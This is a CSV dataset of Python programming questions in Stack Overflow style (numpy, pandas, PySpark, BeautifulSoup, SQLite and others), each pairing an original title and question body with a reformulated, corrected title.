originalTitle,body,reformulatedTitle
how to properly union with set," I understand that any python set union with empty set would result in itself. But some strange behave I detect when union is inside of a for loop.looks good confused anyone could tell me why the last set s is empty?is the output supposed to be every unique element in the set? <code>  num= set([2,3,4])emp= set()print num|emp>>>set([2, 3, 4]) s = set()inp = [""dr101-mr99"",""mr99-out00"",""dr101-out00"",""scout1-scout2"",""scout3- scout1"",""scout1-scout4"",""scout4-sscout"",""sscout-super""]for ele in inp: r = set(ele.split(""-"")) print r s.union(r)print s >>>set(['mr99', 'dr101']) set(['out00', 'mr99']) set(['out00', 'dr101']) set(['scout1', 'scout2']) set(['scout1', 'scout3']) set(['scout4', 'scout1']) set(['scout4', 'sscout']) set(['super', 'sscout']) set([])",How to properly union with set
Python: Compare n arrays," I have n matrices of the same size and want to see how many cells are equal to each other across all matrices. Code: How do I get Python to return a value of 2 (cells 2,1 and 2,3 match in all 3 matrices) or an array of [[False, False, False], [True, False, True], [False, False, False]]? <code>  import numpy as npa = np.array([[1,2,3],[4,5,6],[7,8,9]])b = np.array([[5,6,7], [4,2,6], [7, 8, 9]])c = np.array([2,3,4],[4,5,6],[1,2,5])#Intuition is below but is wronga == b == c",Python: Elementwise comparison of same shaped arrays
What is the difference between a qurydict and multivalue dict?," I was looking to convert a dict to a QueryDict in my django project. Couple of links exists to explain this (Django: Can I create a QueryDict from a dictionary? and How to change a django QueryDict to Python Dict?). This is my simple dictionary which I want to convert abc = {'a': 1, 'b':[1,2,3]}. I have tried this approach: This is the error trace I am getting Why this has failed and how can I get this done?Also what are the differences between MultiValueDict and QueryDict? <code>  from django.http import QueryDictfrom django.utils.datastructures import MultiValueDictabc = { 'a': 1, 'b':[1,2,3]}mdict = MultiValueDict(abc)qdict = QueryDict(mdict) /usr/lib/python2.7/urlparse.pyc in parse_qsl(qs, keep_blank_values, strict_parsing)407 Returns a list, as G-d intended.408 """"""409 pairs = [s2 for s1 in qs.split('&') for s2 in s1.split(';')]410 r = []411 for name_value in pairs:AttributeError: 'MultiValueDict' object has no attribute 'split'",What is the difference between a QueryDict and MultiValueDict?
"numpy using bool array mask, and replace False value with NaN"," I have two arrays, Now I want using b to mask a, retain the True value in a, and replace the False value with NaN, getting a new array that has a shape like a.How to do that? <code>  a = array([ [ 0.93825418, 0.60731973, 0.44218921, 0.90888805, 0.97695114], [ 0.27422807, 0.75870153, 0.12154102, 0.89137678, 0.04257262], [ 0.32855867, 0.17215507, 0.00302302, 0.95395069, 0.02596567], [ 0.18385244, 0.09108341, 0.27925367, 0.0177183 , 0.41035188], [ 0.87229432, 0.73573982, 0.98554476, 0.72321398, 0.98316711], [ 0.16474265, 0.5308054 , 0.27913615, 0.59107689, 0.6480463 ], [ 0.88356436, 0.22343885, 0.74900285, 0.43895017, 0.74993129], [ 0.08097611, 0.48984607, 0.33991052, 0.06431022, 0.10753135], [ 0.67351561, 0.13165046, 0.41327765, 0.21768539, 0.7337069 ], [ 0.65609999, 0.06241059, 0.3400624 , 0.13234171, 0.23679716]])b = array([ [False, True, True, False, False], [ True, False, False, False, False], [ True, True, False, False, False], [False, False, True, False, True], [False, False, False, True, False], [False, True, True, True, True], [False, True, False, True, True], [False, True, True, False, False], [ True, True, True, True, True], [ True, False, True, False, True]], dtype = bool)","Using bool array mask, replace False values with NaN"
Python - Loop through files of certain extensions," I'm trying to loop through a folder and all subfolders to find all files of certain file types - for example, only .mp4, .avi, .wmv.Here is what I have now, it loops through all file types: <code>  import osrootdir = 'input'for subdir, dirs, files in os.walk(rootdir): for file in files: print (os.path.join(subdir, file))",How to loop through files of certain extensions?
Using explict (predefined) validation set for grid search with sklearn," I have a dataset, which has previously been split into 3 sets: train, validation and test. These sets have to be used as given in order to compare the performance across different algorithms.I would now like to optimize the parameters of my SVM using the validation set. However, I cannot find how to input the validation set explicitly into sklearn.grid_search.GridSearchCV(). Below is some code I've previously used for doing K-fold cross-validation on the training set. However, for this problem I need to use the validation set as given. How can I do that? <code>  from sklearn import svm, cross_validationfrom sklearn.grid_search import GridSearchCV# (some code left out to simplify things)skf = cross_validation.StratifiedKFold(y_train, n_folds=5, shuffle = True)clf = GridSearchCV(svm.SVC(tol=0.005, cache_size=6000, class_weight=penalty_weights), param_grid=tuned_parameters, n_jobs=2, pre_dispatch=""n_jobs"", cv=skf, scoring=scorer)clf.fit(X_train, y_train)",Using explicit (predefined) validation set for grid search with sklearn
How to get short sha with gitpython?," The long SHA can be gotten like below: Or, in git 3.1.7: How about short one?(short SHA is decided by the scale of the repo, so it should not be like sha[:7]) <code>  repo = git.Repo(search_parent_directories=True)sha = repo.head.object.hexsha sha = repo.head.commit.hexsha",get short sha of commit with gitpython
Beautiful soup search by text," Observe the following problem: For some reason, BeautifulSoup will not match the text, when the <i> tag is there as well. Finding the tag and showing its text produces Right. According to the Docs, soup uses the match function of the regular expression, not the search function. So I need to provide the DOTALL flag: Alright. Looks good. Let's try it with soup EditMy solution based on geckons answer: I implemented these helpers: Now, when I want to find the element above, I just run find_by_text(soup, 'Edit', 'a', href='/customer-menu/1/accounts/1/update') <code>  import refrom bs4 import BeautifulSoup as BSsoup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> Edit</a>"""""")# This returns the <a> elementsoup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*""))soup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> <i class=""fa fa-edit""></i> Edit</a>"""""")# This returns Nonesoup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*"")) >>> a2 = soup.find( 'a', href=""/customer-menu/1/accounts/1/update"" )>>> print(repr(a2.text))'\n Edit\n' pattern = re.compile('.*Edit.*')pattern.match('\n Edit\n') # Returns Nonepattern = re.compile('.*Edit.*', flags=re.DOTALL)pattern.match('\n Edit\n') # Returns MatchObject soup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> <i class=""fa fa-edit""></i> Edit</a>"""""")soup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*"", flags=re.DOTALL)) # Still return None... Why?! import reMATCH_ALL = r'.*'def like(string): """""" Return a compiled regular expression that matches the given string with any prefix and postfix, e.g. if string = ""hello"", the returned regex matches r"".*hello.*"" """""" string_ = string if not isinstance(string_, str): string_ = str(string_) regex = MATCH_ALL + re.escape(string_) + MATCH_ALL return re.compile(regex, flags=re.DOTALL)def find_by_text(soup, text, tag, **kwargs): """""" Find the tag in soup that matches all provided kwargs, and contains the text. If no match is found, return None. If more than one match is found, raise ValueError. """""" elements = soup.find_all(tag, **kwargs) matches = [] for element in elements: if element.find(text=like(text)): matches.append(element) if len(matches) > 1: raise ValueError(""Too many matches:\n"" + ""\n"".join(matches)) elif len(matches) == 0: return None else: return matches[0]",BeautifulSoup - search by text inside a tag
Show Tables in SQLite Database," I know this is a very basic question but for some reason I can't get past this one error. I'm trying to show/put all the names of the tables in a database (named 'GData.db') into a variable available_tables in Python. Currently I have the following: This gives me the following error for the second-last line: I've looked at the SHOW TABLES documentation as well as around the web but not found information that helps me.  <code>  con = sql.connect(r'/Users/linnk/Desktop/Results/GData.db')cur = con.cursor() cur.execute(""SHOW TABLES IN GData"")available_table=(cursor.fetchall()) OperationalError: near ""SHOW"": syntax error",Show Tables in SQLite Database in Python
add a coma between the elements of a numpy array," I have a numpy array which looks like and I want it to become I tried but it returns an error: 'numpy.ndarray' object has no attribute 'split' <code>  a = ['blue' 'red' 'green'] b = ['blue', 'red', 'green'] b = a.split(' ')",add a comma between the elements of a numpy array
Python: Yield and Yield Assignment," How does this code, involving assignment and the yield operator, work? The results are rather confounding. Output: <code>  def test1(x): for i in x: _ = yield i yield _def test2(x): for i in x: _ = yield i r1 = test1([1,2,3])r2 = test2([1,2,3])print list(r1)print list(r2) [1, None, 2, None, 3, None] [1, 2, 3]",Python: yield and yield assignment
"copy 2D array into 3rd dimension, N times (Python)"," I'd like to copy a numpy 2D array into a third dimension. For example, given the 2D numpy array: convert it into a 3D matrix with N such copies in a new dimension. Acting on arr with N=3, the output should be: <code>  import numpy as nparr = np.array([[1, 2], [1, 2]])# arr.shape = (2, 2) new_arr = np.array([[[1, 2], [1,2]], [[1, 2], [1, 2]], [[1, 2], [1, 2]]])# new_arr.shape = (3, 2, 2)","How to copy a 2D array into a 3rd dimension, N times?"
Write pandas dataframe containing comma-separated-string to CSV," Using the impyla module, I've downloaded the results of an impala query into a pandas dataframe, done analysis, and would now like to write the results back to a table on impala, or at least to an hdfs file. However, I cannot find any information on how to do this, or even how to ssh into the impala shell and write the table from there. What I'd like to do: Once I've done whatever I need to do with pandas_df, save those results back to impala as a table. The above scenario would be ideal, but I'd be happy if I could figure out how to ssh into impala-shell and do this from python, or even just save the table to hdfs. I'm writing this as a script for other users, so it's essential to have this all done within the script. Thanks so much!  <code>  from impala.dbapi import connectfrom impala.util import as_pandas# connect to my host and portconn=connect(host='myhost', port=111) # create query to save table as pandas dfcreate_query = """""" SELECT * FROM {} """""".format(my_table_name)# run query on impalacur = conn.cursor()cur.execute(create_query)# store results as pandas data framepandas_df = as_pandas(cur)cur.close() # create query to save new_df back to impalasave_query = """""" CREATE TABLE new_table AS SELECT * FROM pandas_df """"""# run query on impalacur = conn.cursor()cur.execute(save_query)cur.close()",Write pandas table to impala
Python Pandas: How to I round datetime column to nearest quarter hour," I have loaded a data file into a Python pandas dataframe. I has a datetime column of the format 2015-07-18 13:53:33.280. What I need to do is create a new column that rounds this out to its nearest quarter hour. So, the date above will be rounded to 2015-07-18 13:45:00.000.How do I do this in pandas? I tried using the solution from here, but get an 'Series' object has no attribute 'year' error.  <code> ",How do I round datetime column to nearest quarter hour
Resize NumPy array without copy," When I shrink a numpy array using the resize method (i.e. the array gets smaller due to the resize), is it guaranteed that no copy is made?Example: From my understanding this should always be possible without making a copy. My question: Does the implementation indeed guarantee that this is always the case? Unfortunately the documentation of resize says nothing about it. <code>  a = np.arange(10) # array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])a.resize(5, refcheck=False) # array([0, 1, 2, 3, 4])",Resize NumPy array to smaller size without copy
Python error: 'UCS-2' codec can't encode characters in position 1050-1050," When I run my Python code, I get the following errors: Here is my code: How can I fix this? <code>  File ""E:\python343\crawler.py"", line 31, in <module> print (x1) File ""E:\python343\lib\idlelib\PyShell.py"", line 1347, in write return self.shell.write(s, self.tags)UnicodeEncodeError: 'UCS-2' codec can't encode characters in position 1050-1050: Non-BMP character not supported in Tk x = g.request('search', {'q' : 'TaylorSwift', 'type' : 'page', 'limit' : 100})['data'][0]['id']# GET ALL STATUS POST ON PARTICULAR PAGE(X=PAGE ID)for x1 in g.get_connections(x, 'feed')['data']: print (x1) for x2 in x1: print (x2) if(x2[1]=='status'): x2['message']",'UCS-2' codec can't encode characters in position 1050-1050
Automate creating circles (Python)," I'm trying to plot several (many thousands) of circle objects - I don't have much experience working with python. I'm interested in specifying the position, radius and color. Is there a more efficient way to achieve the same result?: <code>  import matplotlib.pyplot as pltxvals = [0,.1,.2,.3]yvals = [0,.1,.2,.3]rvals = [0,.1,.1,.1]c1vals = [0,.1,0..1]c2vals = [.1,0,.1,0]c3vals = [.1,.1,.1,.1]for q in range(0,4): circle1=plt.Circle((xvals[q], yvals[q]), rvals[q], color=[0,0,0]) plt.gcf().gca().add_artist(circle1)",How can I plot many thousands of circles quickly?
How can I create many thousands of circles?," I'm trying to plot several (many thousands) of circle objects - I don't have much experience working with python. I'm interested in specifying the position, radius and color. Is there a more efficient way to achieve the same result?: <code>  import matplotlib.pyplot as pltxvals = [0,.1,.2,.3]yvals = [0,.1,.2,.3]rvals = [0,.1,.1,.1]c1vals = [0,.1,0..1]c2vals = [.1,0,.1,0]c3vals = [.1,.1,.1,.1]for q in range(0,4): circle1=plt.Circle((xvals[q], yvals[q]), rvals[q], color=[0,0,0]) plt.gcf().gca().add_artist(circle1)",How can I plot many thousands of circles quickly?
iPython: Configure Base Url Path for All Request," I am trying to figure out how to configure the base url of and IPython notebook server running. So instead of the default: I want to configure all requests so that the go through ipython, as in: Is this possible? <code>  #request# GET http://localhost:8888/static/tree/js/main.min.js?v=04a28c5e21950738efb217191f08ac33#request# GET http://localhost:8888/api/terminals?_=1441754529652#request# GET http://localhost:8888/custom/custom.js?v=20150908160654#request# GET http://localhost:8888/notebooks/Untitled1.ipynb?kernel_name=python3# #request# GET http://localhost:8888/ipython/static/tree/js/main.min.js?v=04a28c5e21950738efb217191f08ac33#request# GET http://localhost:8888/ipython/api/terminals?_=1441754529652#request# GET http://localhost:8888/ipython/custom/custom.js?v=20150908160654#request# GET http://localhost:8888/ipython/notebooks/Untitled1.ipynb?kernel_name=python3#",IPython: Configure Base Url Path for All Request
python: json.encoder.FLOAT_REPR changed but no effect," I am trying to make my JSON encoder dump floats with only 2 decimal precision. So '2.241' becomes '2.24'I've read in this answer by Alex Martelli that you can overwrite the default FLOAT_REPR of json.encoder. I have tried the following: But I dont get the same results: And I can even verify the FLOAT_REPR is changed: And works as expected: Why is the built-in JSON module not using the FLOAT_REPR when I can see that it has been overwritten and the solution should be working according to Alex Martelli? I have tested this on two different computers, both running Python 2.7.6 on Ubuntu 14.0.4. <code>  >>> import json>>> json.encoder.FLOAT_REPR = lambda o: format(o, '.2f') >>> json.dumps(2.241)'2.241' >>> print json.encoder.FLOAT_REPR<function <lambda> at 0xb....> >>> json.encoder.FLOAT_REPR(2.241)2.24",json.encoder.FLOAT_REPR changed but no effect
Can Luigi propage exception or return any result?," I am using Luigi to launch some pipeline.Let's take a simple exemple Now let's say that myTask is raising an exception during execution. All that I am able to have is a log from luigi showing the exception. Is there any way that luigi could propagate it or at least return a failure status ? I would then be able to make my programm react in function of that state.Thanks.EDITI forgot to specify that luigi's outputs are targetting a database when I am storing the result. If an exception is raised, no result are stored but the exception is not propagated out a luigi. I was wondering if luigi have an option to have this. <code>  task = myTask()w = Worker(scheduler=CentralPlannerScheduler(), worker_processes=1)w.add(task)w.run()",Can Luigi propagate exception or return any result?
How to create simple 3-layer neural network in PyBrain and teach it using supervised learning?," Based on PyBrain's tutorials I managed to knock together the following code: It's supposed to learn XOR function, but the results seem quite random:0.2088849295220.1689265157710.4594528340430.424209192223or0.849561386640.8885127627860.5649640774010.611111147862 <code>  #!/usr/bin/env python2# coding: utf-8from pybrain.structure import FeedForwardNetwork, LinearLayer, SigmoidLayer, FullConnectionfrom pybrain.datasets import SupervisedDataSetfrom pybrain.supervised.trainers import BackpropTrainern = FeedForwardNetwork()inLayer = LinearLayer(2)hiddenLayer = SigmoidLayer(3)outLayer = LinearLayer(1)n.addInputModule(inLayer)n.addModule(hiddenLayer)n.addOutputModule(outLayer)in_to_hidden = FullConnection(inLayer, hiddenLayer)hidden_to_out = FullConnection(hiddenLayer, outLayer)n.addConnection(in_to_hidden)n.addConnection(hidden_to_out)n.sortModules()ds = SupervisedDataSet(2, 1)ds.addSample((0, 0), (0,))ds.addSample((0, 1), (1,))ds.addSample((1, 0), (1,))ds.addSample((1, 1), (0,))trainer = BackpropTrainer(n, ds)# trainer.train()trainer.trainUntilConvergence()print n.activate([0, 0])[0]print n.activate([0, 1])[0]print n.activate([1, 0])[0]print n.activate([1, 1])[0]",How to create simple 3-layer neural network and teach it using supervised learning?
Python:module 'os' has no attribute 'mknod'," I want to create a new file in Python for that I am using mknod command, but getting error as: I am using windows and attributes other than 'mknod' are working. <code>  os.mknod();AttributeError: module 'os' has no attribute 'mknod'",Python module 'os' has no attribute 'mknod'
"random.choice() returns same value at the same second, how i avoid it?"," I have been looking at similar questions regarding how to generate random numbers in python. Example: Similar Question - but i do not have the problem that the randomfunction returns same values every time. My random generator works fine, the problem is that it returns the same value when calling the function at, what I think, the same second which is undesireable. My code looks like this As I mentioned this function returns different values when being called at on different times but returns the same value when calling the function at the same time. How do I avoid this problem? I use this function in a back-end-server to generate unique IDs for users in front-end to insert in a database so I cannot control the time intervals when this happens. I must have random tokens to map the users in the database to be able to insert them correctly with queuenumbers in the database. <code>  def getRandomID(): token = '' letters = ""abcdefghiklmnopqrstuvwwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"" for i in range(1,36): token = token + random.choice(letters) return token","random.choice() returns same value at the same second, how does one avoid it?"
Python number in list," How can I see if an index contains certain numbers? <code>  numbers = [2349523234, 12345123, 12346671, 13246457, 134123431]for number in numbers: if (4 in number): print(number + ""True"") else: print(""False"")",Check if a digit is present in a list of numbers
Check if a digit is preent in a list of numbers," How can I see if an index contains certain numbers? <code>  numbers = [2349523234, 12345123, 12346671, 13246457, 134123431]for number in numbers: if (4 in number): print(number + ""True"") else: print(""False"")",Check if a digit is present in a list of numbers
What's the best way to use Python and OpenCV with multiprocessing?," I'm using Python 3.4.3 and OpenCV 3.0.0 to process (applying various filters to) a very large image (80,000 x 60,000) in memory and I'd like to use multiple CPU cores to improve performance. After some reading, I arrived at two possible method : 1) Use python's multiprocessing module, let each process deal with a slice of the large image and join the results after processing is done (And this probably should be performed on POSIX system?) 2) Since NumPy supports OpenMP and OpenCV uses NumPy, I can just leave the multiprocessing to NumPy? So my question is :Which one will be a better solution? (If they don't seem reasonable, what would be a possible approach? )If Option 2 is good, should I build both NumPy and OpenCV with OpenMP ? How would I actually make multi-processing happen? ( I couldn't really find useful instruction..)  <code> ",How to use Python and OpenCV with multiprocessing?
Can't convert SVM to DataFrame using loadLibSVMFile on Spark : 'PipelinedRDD' object has no attribute 'toDF'," I'm trying to load an SVM file and convert it to a DataFrame so I can use the ML module (Pipeline ML) from Spark.I've just installed a fresh Spark 1.5.0 on an Ubuntu 14.04 (no spark-env.sh configured).My my_script.py is: and I'm running using: ./spark-submit my_script.pyAnd I get the error: What I can't understand is that if I run: directly inside PySpark shell, it works. <code>  from pyspark.mllib.util import MLUtilsfrom pyspark import SparkContextsc = SparkContext(""local"", ""Teste Original"")data = MLUtils.loadLibSVMFile(sc, ""/home/svm_capture"").toDF() Traceback (most recent call last):File ""/home/fred-spark/spark-1.5.0-bin-hadoop2.6/pipeline_teste_original.py"", line 34, in <module>data = MLUtils.loadLibSVMFile(sc, ""/home/fred-spark/svm_capture"").toDF()AttributeError: 'PipelinedRDD' object has no attribute 'toDF' data = MLUtils.loadLibSVMFile(sc, ""/home/svm_capture"").toDF()",'PipelinedRDD' object has no attribute 'toDF' in PySpark
how to get the difference between 2 dictionaries in python," I have two dictionaries, and I need to find the difference between the two, which should give me both a key and a value.I have searched and found some addons/packages like datadiff and dictdiff-master, but when I try to import them in Python 2.7, it says that no such modules are defined.I used a set here: My output is: I am getting only keys, and I need to also get the values. <code>  first_dict = {}second_dict = {} value = set(second_dict) - set(first_dict)print value >>> set(['SCD-3547', 'SCD-3456'])",How to get the difference between two dictionaries in Python?
python for loop increasing or decreasing," I have to loop between two values where sometimes the first value is less than the second, and some other times the first is greater than the second (I'm working on two cells inside a grid and the first cell can be on the left of the second or vice versa).With Python, I can specify if a for loop has to decrease or to increase its values, but the result is something like that: Is there something more ""pythonic"" to obtain this? <code>  step = 1if y < x: step = -1for n in range(x, y, step): pass",How to make a for loop either increasing or decreasing?
"Differences in performance using np.power(x, 3) and x*x*x"," I was just revisiting some of my code to improve the performance and stumpled over something strange: Ok it seems to have some overhead when using the power-operator (**) but otherwise they seem identical (I guess NumPy is doing that) but then it got strange: So there is no problem but it seems a bit inconsistent to have a fallback for the magic pow but not for the UFUNC. But then I got interested since I am using third powers a lot: There seems to be no ""shortcut"" in the third power and UFUNC and 'magic-pow' work the same (at least in regard to performance).But that's not that good since I want a consistent method of using powers in my code and I'm not quite sure how to wrap the __pow__ of numpy.So to get to the point, my question is :Is there a way I can wrap the numpys __pow__ method? Because I want a consistent way of writing powers in my script not writing a**2 and at another place power(a, 3). Simply writing a**3, and redirecting this to my power function, would be preferred (but for that I would need to somehow wrap the ndarrays __pow__ or?). Currently I am using a shortcut but that's not that beautiful (I even have to declare the exponent==2 case since np.power performs not optimal there): I am using NumPy v1.9.3 and I do not want to subclass np.ndarray just for wrapping the __pow__ method. :-)EDIT: I rewrote the part where I get to my question. To clarify it: I am not asking about why NumPy does it the way it does - that is just to explain why I ask the question. <code>  a = np.linspace(10,1000,1000000).reshape(1000,1000)%timeit np.square(a)100 loops, best of 3: 8.07 ms per loop%timeit a*a100 loops, best of 3: 8.18 ms per loop%timeit a**2100 loops, best of 3: 8.32 ms per loop In [46]: %timeit np.power(a, 2)10 loops, best of 3: 121 ms per loop %timeit a*a*a100 loops, best of 3: 18.1 ms per loop%timeit a**310 loops, best of 3: 121 ms per loop%timeit np.power(a, 3)10 loops, best of 3: 121 ms per loop def power(array, exponent): if exponent == 2: #catch this, or it calls the slow np.power(array, exponent) return np.square(array) if exponent == 3: return array * array * array #As soon as np.cbrt is avaiable catch the exponent 4/3 here too return np.power(array, exponent) %timeit power(a, 3)100 loops, best of 3: 17.8 ms per loop%timeit a**310 loops, best of 3: 121 ms per loop",Wrapping np.arrays __pow__ method
"Pass !, !=, ~, <, > as python params", I want to be able to pass arguments like this: I saw this behavior in DjangoORM and SQLAlchemy but I don't know how to achieve it. <code>  fn(a>=b) or fn(a!=b),"Pass !, !=, ~, <, > as parameters"
Jinja2 variable inside a variable," I am trying to iterate over a dictionary in a Jinja2 template (in Ansible). One of the arrays or keys in the dictionary is 'abcd'This {{ item.value.abcd.port }} works fine, but key 'abcd' varies in each dictionary. I am looking to do something like below using a variable 'nginx_dir'. Or without using a variable at all, something like this <code>  {% set nginx_dir = item.value.keys().1 %}{% set my_port = item.value.nginx_dir.port %} {{ item.value.[item.value.keys().1].port }}",Python (Jinja2) variable inside a variable
Pyspark changing type of df from data to string," I have the following dataframe: Now I would like to change the datatype of the column vacationdate to String, so that also the dataframe takes this new type and overwrites the datatype data for all of the entries. E.g. after writing: The datatype of vacationdate should be overwritten.I already used functions like cast, StringType or astype, but I was not successful. Do you know how to do that? <code>  corr_temp_df[('vacationdate', 'date'), ('valueE', 'string'), ('valueD', 'string'), ('valueC', 'string'), ('valueB', 'string'), ('valueA', 'string')] corr_temp_df.dtypes",Pyspark changing type of column from date to string
Pyspark changing type of df from date to string," I have the following dataframe: Now I would like to change the datatype of the column vacationdate to String, so that also the dataframe takes this new type and overwrites the datatype data for all of the entries. E.g. after writing: The datatype of vacationdate should be overwritten.I already used functions like cast, StringType or astype, but I was not successful. Do you know how to do that? <code>  corr_temp_df[('vacationdate', 'date'), ('valueE', 'string'), ('valueD', 'string'), ('valueC', 'string'), ('valueB', 'string'), ('valueA', 'string')] corr_temp_df.dtypes",Pyspark changing type of column from date to string
"In Python (Pandas), How to remove last the two strings of a column df", How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
"In Python (Pandas), How to remove last the two characters in a column that is int", How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How to remove last the two characters in a column that is int, How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How to remove last the two characters in a column that is of integer type?, How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How do you alias a type in python?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How do you alias a type?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How do you alias a type iny Python?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How to validate time format? python," This is what I have so far, it probably is completely junk. What I want to do is validate caminput1, so that the format is HH:MM:SS. The hashes are from when I was testing. I am not very experienced with the syntax of all this stuff, or coding in general, but before you tell me to go and look it up.I have been looking around for ages, and I cannot find anything that explains the whole process. <code>  def cameraspeedcheck(): timeformat = (""%H:%M:%S"") caminput1 = input(""At what time did sensor 1 actuate? "") # is caminput1 = time(HH:MM:SS) # time.strptime(caminput1[%H:%M:%S]) caminput1.strptime(timeformat) # else cameraspeedcheck()",How to validate time format?
Fetch recursively connected nodes in a NetworkX graph," Straightforward question: I would like to retrieve all the nodes connected to a given node within a NetworkX graph in order to create a subgraph. In the example shown below, I just want to extract all the nodes inside the circle, given the name of one of any one of them.I've tried the following recursive function, but hit Python's recursion limit, even though there are only 91 nodes in this network.Regardless of whether or not the below code is buggy, what is the best way to do what I'm trying to achieve? I will be running this code on graphs of various sizes, and will not know beforehand what the maximum recursion depth will be. <code>  def fetch_connected_nodes(node, neighbors_list): for neighbor in assembly.neighbors(node): print(neighbor) if len(assembly.neighbors(neighbor)) == 1: neighbors_list.append(neighbor) return neighbors_list else: neighbors_list.append(neighbor) fetch_connected_nodes(neighbor, neighbors_list)neighbors = []starting_node = 'NODE_1_length_6578_cov_450.665_ID_16281'connected_nodes = fetch_connected_nodes(starting_node, neighbors)",Fetch connected nodes in a NetworkX graph
Finding the largest object in a python generator," Let's say I have a generator gen which yields some lists. I'd like to find the longest list.I can do which will get me the length of the longest list, but at this point the list is gone to the mists of time.Alternately I could do But it seems there should be a more pythonic way that avoids the for loop and the if statement.edit just a comment to help others who might search for related problems:Finding the smallest object with min can be done equivalently, and the same approach will work if gen is a list instead. <code>  max((len(L) for L in gen)) maxlength = 0for L in gen: if len(L)>maxlength: savelist = L maxlength = len(L)",Finding the largest/smallest object in a python generator/list
How to plot several graphs and make use of the navigation button in MatPlotLib," The latest version of matplotlib automatically creates navigation buttons under the graph. However, the examples I see in the Internet all just show how to create one graph, thus making the button [Next] and [Previous] useless. How do I plot several graphs and make use of those buttons?For example I want to make graph for sin() and cos() from 0 degree to 360 degree.Right now I do it like this: The sin() graph will be shown. It is when I close the window that the cos graph will be shown. If I exclude the first pyplot.show(), both will be shown in the same figure.How to make it so that the second graph is shown when I press the Next button? <code>  import scipyfrom matplotlib import pyplotDataRange = range(0, 360)DataRange = map(scipy.deg2rad, DataRange)Data1 = map(scipy.sin, DataRange)Data2 = map(scipy.cos, DataRange)pyplot.plot(Data1)pyplot.show() # <--- if I exclude thispyplot.plot(Data2)pyplot.show()",How to plot several graphs and make use of the navigation button in [matplotlib]
How do I use multiple conditions with pyspark.sql.funtions.when()?," I have a dataframe with a few columns. Now I want to derive a new column from 2 other columns: With this I only get an exception: It works with just one condition like this: Does anyone know to use multiple conditions?I'm using Spark 1.4. <code>  from pyspark.sql import functions as Fnew_df = df.withColumn(""new_col"", F.when(df[""col-1""] > 0.0 & df[""col-2""] > 0.0, 1).otherwise(0)) py4j.Py4JException: Method and([class java.lang.Double]) does not exist new_df = df.withColumn(""new_col"", F.when(df[""col-1""] > 0.0, 1).otherwise(0))",How do I use multiple conditions with pyspark.sql.functions.when()?
